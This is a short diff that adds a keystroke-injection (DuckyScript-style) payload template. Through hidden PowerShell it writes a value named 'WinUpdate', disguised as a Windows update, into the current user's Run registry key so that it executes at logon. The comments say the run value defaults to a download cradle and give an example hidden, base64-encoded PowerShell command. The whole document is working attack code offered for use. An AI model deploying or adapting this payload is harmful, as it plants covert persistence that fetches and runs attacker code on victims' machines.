@@ -1,0 +1,5 @@
+REM persistence via HKCU Run key (runs {{RUN_VALUE}} at logon)
+REM Token {{RUN_VALUE}} defaults to a download-cradle; supply your own, e.g.:
+REM   --var "RUN_VALUE=powershell -w hidden -e SQBFAFgA..."
+STRING powershell -NoProfile -WindowStyle Hidden -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdate' -Value '{{RUN_VALUE}}' -Force"
+ENTER
